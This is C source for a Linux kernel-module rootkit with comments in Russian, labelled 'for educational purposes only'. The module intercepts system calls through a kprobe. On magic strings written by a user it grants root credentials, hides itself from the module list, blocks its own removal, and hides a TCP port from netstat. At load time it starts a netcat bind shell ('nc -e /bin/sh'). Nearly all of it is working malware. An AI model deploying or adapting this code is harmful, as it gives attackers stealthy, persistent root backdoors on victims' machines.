#include </home/ubuntu/new_dir/wann3r.h>



MODULE_AUTHOR("Vlhll - Vladimir T.");
MODULE_DESCRIPTION("For educational purposes only.");


//	функция, отвечающая за маскировку сокета,
//	идентифицируемого по конкретному порту

static int hidp_func(const char *port){
    char buf[10] = {'\x00','\x00','\x00','\x00','\x00','\x00','\x00','\x00','\x00','\x00'};
    char* endptr = "\x00";
	strncpy(buf, port + 11 , 5); 				 /* Копируем переданный порт
								  Здесь не исп. copy_from_user, т.к. функции x64_sys_call
								  уже передается информация в режиме ядра */
	
	hid_port = simple_strtoul(buf, &endptr , 10);
	if (hid_port < 1024 || hid_port > 65536)
        return -1;
	
    if (register_kprobe(&tcp_hid))
		pr_alert("can't register\n");			/* регистрируем обработчик, реагирующий на функцию tcp4_seq_show,
								   вызываемую утилитой netstat */
    return 0;
}


//	функция, непосредственно маскирующая сокет

static int tcp_hid_func(struct kprobe *p,  struct pt_regs *regs){

   if (regs->si != SEQ_START_TOKEN) {  /* Если запись из netstat не является заголовком, выводимым командой */

    struct sock *sk = (struct sock *)regs->si; 	/* Получаем сокет, информация о котором должна вывестись на экран */

        if (sk && sk->sk_num == hid_port) {	/* Прячем необходимое соединение */	

            regs->si = (unsigned long)SEQ_START_TOKEN;  /* Здесь грязный хак...
                                                          Говорим, что это заголовок команды netstat : ) */
        }
   }
    return 0;
}


static int getFreePort(void){
    sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock_tmp);  /* создаем временный сокет
                                                                                  для нахождения свободного порта */
    sk = sock_tmp->sk; /* получаем инициализированную структуру sock */

    int candidate = 1024;
    int max_port = 65536; 

    for (int i = candidate; i < max_port; i++) { 

        if (!inet_csk_get_port(sk, i) ) { /* если порт свободен */

            candidate = i;
			sock_release(sock_tmp); 	/* освобождаем временный сокет, необходимый для определения свободного порта */
			sk       = NULL;            
			sock_tmp = NULL;
			pr_info("candidate: %d\n", candidate);
            return candidate; // free port
        }
    }
    pr_info("BAD: %d\n", candidate);
    return -1;
}


 
//	функции открытия shell-оболочки на порту.
//	Флаг UMH_WAIT_EXEC необходим и достаточен для того, чтобы callback Kprob'ы - 
//	run_shell_nodelay - не вызвал долгую блокировку процессора, поскольку 
//	kprobe callbacks блокируют прерывания текущего процессора и являются невытесняемыми.
//	В данном случае usermodehelper ждет только выполнения команды

static void run_shell_nodelay(int candidate){  /* candidate - порт, на который вешается шелл */

    char tmp[100];
    snprintf(tmp, sizeof(tmp), "nc -e /bin/sh -p %d -l", candidate); /* вешаем шелл на порт */
    argv[2] = tmp;
    static char *envp[] = {"PATH=/bin:/sbin",NULL}; /* директория, в которой будет осуществляться
                                                       поиск необходимых бинарников */

    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)) /* call_usermodehelper запускает процесс в пространстве пользователя.
                                                                    флаг UMH_WAIT_EXEC заставляет ждать ядро только выполнение команды, не более */
		pr_alert("can't usermodehelperer\n");
}


static void run_shell_delay(struct work_struct *wrk){
    char tmp[100];
	snprintf(tmp, sizeof(tmp), "nc -e /bin/sh -p %d -l", port);
    argv[2] = tmp;
    static char *envp[] = {"PATH=/bin:/sbin",NULL};
    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC))
		pr_alert("can't usermodehelperer\n");
}



static int shll_func(const char *from_user_port){

    char buf[10] = {'\x00','\x00','\x00','\x00','\x00','\x00','\x00','\x00','\x00','\x00'};
    char* endptr = "\x00";

    strncpy(buf, from_user_port + 11 , 5); 
    port = simple_strtoul(buf, &endptr , 10);

    pr_info("port is: %lu\n",port);

    if (port < 1024 || port > 65536)
        return -1;

    INIT_WORK(&wrk, run_shell_delay); /* ставим run_shell_delay в глобальную очередь ядра 
    schedule_work(&wrk);		 для отложенного выполнения */
    return 0;
}


static int root_func(void){ 
    struct cred *newcreds;
    newcreds = prepare_creds();			
    if (newcreds == NULL){

	pr_alert("can't prepare creds\n");
        return 1;

	}

    newcreds->uid.val   =  newcreds->gid.val = 0; 
    newcreds->euid.val  =  newcreds->egid.val = 0;
    newcreds->suid.val  =  newcreds->sgid.val = 0;
    newcreds->fsuid.val =  newcreds->fsgid.val = 0;

    commit_creds(newcreds);
    return 0;

}

// функция, меняющая кол-во ссылок на наш модуль
// Если кол-во ссылок >0, то модуль нельзя удалить командой rmmod / modprobe

static inline void no_rm_func(void){             
    atomic_t *pRefcnt = &THIS_MODULE->refcnt;
    atomic_set(pRefcnt, 1337);
}

static inline void yes_rm_func(void){
    atomic_t *pRefcnt = &THIS_MODULE->refcnt;
    atomic_set(pRefcnt, 1);
}

// list_del не использовал, поскольку  теперь в list_del есть проверка на list corruption

static inline void  hide_func(void){ 
    module_previous = THIS_MODULE->list.prev;
    module_previous->next = THIS_MODULE->list.next;
    hidden=1;
}


static inline void  show_func(void){     
    if (module_previous !=NULL && hidden==1){
        module_previous->next = &THIS_MODULE->list;
        hidden=0;
    }
}






//	Функция является kprobe-pre-handler'ом
//	для обработчика системных вызовов - x64_sys_call
//	
//	Поскольку теперь sys_call_table нельзя использовать
//	для перехвата системных вызовов, Перехватываем  x64_sys_call
//	
//	Важный момент: функция не имеет синхронизации на уровне всей системы, поскольку
//	1) kprobe handlers блокируют прерывания только на текущем процессоре
//	2) идеалогия руткитов - не проявлять себя, соответственно, не оказывать сильного
//	влияния на производительность системы



static int intercept(struct kprobe *p,  struct pt_regs *regs) {
        if (regs->si == __NR_write){                               

             struct pt_regs *pRegs = (struct pt_regs*)regs->di; /* аргументы переданные в syscall */

            if (!strncmp( (const char*)(pRegs->si) , ROOT ,10)) {

                root_func();
                pr_info("root gotten\n");

                return 0;
            }
            if (!strncmp( (const char*)(pRegs->si) , HIDE ,10 )){

                hide_func();
                pr_info("module hidden\n");

                return 0;
            }
            if (!strncmp( (const char*)(pRegs->si) , SHOW ,10 )){

                show_func();
                pr_info("module shown\n");

                return 0;
            }
            if (!strncmp( (const char*)(pRegs->si) , NORM ,10 )){

                no_rm_func();
                pr_info("protection activated\n");

                return 0;
            }
            if (!strncmp( (const char*)(pRegs->si) , YERM ,10 )){

                yes_rm_func();
                pr_info("protection deactivated\n");

                return 0;
            }
            if (!strncmp( (const char*)(pRegs->si) , SHLL ,10 )){
                if (!bit_chk(&stop,5) ){
                    bit_set(&stop,5);

                    shll_func((const char *)pRegs->si);

                    pr_info("door is opened\n");
                    return 0;
                }

                bit_unset(&stop,5);
                return 0;
            }
            if (!strncmp( (const char*)(pRegs->si) , HIDP ,10 )){

                hidp_func( (const char*)pRegs->si);
                pr_info("port is hidden: %lu\n",hid_port);

                return 0;
            }
        }

    return 0;
}

// примитивная синхронизация
static inline int bit_chk(u8 *chk, int order_bit) {
    return (*chk & (1 << order_bit)) ? 1 : 0;
}
static inline void bit_set(u8 *tgt, int order_bit){
    *tgt |= (1 << order_bit);
}
static inline void bit_unset(u8 *tgt, int order_bit){
    *tgt &= ~(1 << order_bit);
}





static int __init init(void) {

    int cand = getFreePort(); 		/* получаем свободный порт */
    run_shell_nodelay(cand); 		/*вешаем шелл на него*/

    
    if (register_kprobe(&un) != 0) {
        pr_err("Failed to register kprobe");
        return -1;
    }
    return 0;
}


static void __exit bye(void) {
    unregister_kprobe(&un);
    unregister_kprobe(&tcp_hid);
}

module_init(init);
module_exit(bye);
